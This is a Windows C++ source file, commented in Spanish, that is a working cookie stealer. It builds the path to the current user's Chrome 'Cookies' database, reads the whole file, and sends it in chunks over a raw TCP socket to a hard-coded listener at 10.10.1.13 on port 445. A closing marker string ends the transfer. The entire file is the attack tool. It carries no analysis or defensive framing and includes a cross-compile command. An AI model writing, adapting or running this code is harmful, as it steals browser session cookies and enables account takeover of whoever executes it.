#include<stdio.h>
#include<winsock2.h>
#include<math.h>
#include <string>
#include <cstring>
#include <windows.h>
#include <lmcons.h>
//Compilacion: i686-w64-mingw32-g++ enviarCookies.cpp -o envia -static-libgcc -static-libstdc++ -lwsock32
#pragma comment(lib,"ws2_32.lib")
#define LHOST "10.10.1.13"
#define LPORT 445
#define BUFF 1000
#define NOMARCH "Cookies"
#define CLOSESTR "TT2019B102"
using namespace std;

int main(int argc , char *argv[]){
       WSADATA wsa;
       SOCKET s;
       struct sockaddr_in server;
       char message[BUFF];

       unsigned char *buffer = NULL;
       int filelen = 0, temp = 0;
       float packetnumbers = 0.0f;
       int paquetes = 0, izquierda = 0, derecha = 0, i = 0;
       FILE * fc = NULL;

       string nom_archivo = NOMARCH;
       char username[UNLEN+1];
       DWORD username_len = UNLEN+1;
       GetUserName(username, &username_len);
       string user(username);      
       string ruta_archivo = "C:\\Users\\" + user + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\" + nom_archivo;

       //printf("Iniciando Winsock");
       if (WSAStartup(MAKEWORD(2,2),&wsa) != 0){
              printf("Algo salio mal: %d",WSAGetLastError());
              return 1;
       }
       //printf("Inicializado\n");
       if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET){
              printf("No se pudo crear el socket: %d" , WSAGetLastError());
       }
       //printf("Socket creado\n");
       server.sin_addr.s_addr = inet_addr(LHOST);
       server.sin_family = AF_INET;
       server.sin_port = htons(LPORT);
       if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0){
              perror("Error al conectar ");
              return 1;
       }
       //printf("Conectado\n");

       if((fc = fopen(ruta_archivo.c_str(), "rb"))== NULL){
              perror("Algo salio mal ");
       }
       fseek(fc, 0, SEEK_END);
       filelen = (int)ftell(fc);
       rewind(fc);
       if((buffer = (unsigned char *)malloc((filelen+1)*sizeof(char))) == NULL){
              perror("Algo salio mal ");
       }
       memset(buffer, 0, sizeof(buffer));
       for(i = 0; i < filelen; i++){
              fread(*&buffer+i, 1, 1, fc);
       }

       packetnumbers = (float)filelen / (float)BUFF;
       izquierda = (int)packetnumbers;
       derecha = (packetnumbers - (float)izquierda) * BUFF;
       //printf("Longitud %d, Division %f, Parte izquierda %d, Parte derecha %d\n", filelen, packetnumbers, izquierda, derecha);
       temp = filelen;
       i=0;
       //printf("Enviando...\n");
       while(temp > BUFF){
              //printf("padding: %d\n", i);
              memcpy(message, buffer+i, BUFF);
              Sleep(200);
              send(s, message, BUFF, 0);
              Sleep(200);
              temp = temp - BUFF;
              i = i + 1 * BUFF;
              memset(buffer, 0, sizeof(buffer));
       }
       memcpy(message, buffer+i, temp);
       send(s, message, temp, 0);
       send(s, CLOSESTR, strlen(CLOSESTR), 0);
       //printf("Finalizado\n");
       fclose(fc);
       closesocket(s);
       return 0;
}
